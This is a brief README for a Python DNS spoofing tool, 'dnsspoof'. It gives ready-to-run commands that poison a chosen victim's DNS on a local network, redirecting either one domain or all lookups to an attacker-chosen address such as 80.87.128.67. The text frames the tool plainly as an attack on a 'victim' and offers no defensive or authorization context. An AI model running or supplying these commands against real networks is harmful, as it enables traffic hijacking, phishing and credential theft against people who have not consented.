# dnsspoof: DNS Spoofing Tool

`dnsspoof` is a command-line utility designed to intercept and alter DNS responses on a network. It effectively replaces genuine DNS responses with ones crafted by the user, allowing for redirection of traffic to a specified IP address.

## How to Use dnsspoof

To redirect a specific domain to the attacker's machine:

```shell
python dnsspoof.py -r <router_ip> -v <victim_ip> -d <target_domain>

For example, to spoof domaintospoof.com:

python dnsspoof.py -r 192.168.0.1 -v 192.168.0.5 -d domaintospoof.com

To redirect all DNS requests to a particular IP address:

python dnsspoof.py -r <router_ip> -v <victim_ip> -a -t <target_ip>

For instance, to point all DNS lookups to 80.87.128.67:

python dnsspoof.py -r 192.168.0.1 -v 192.168.0.5 -a -t 80.87.128.67
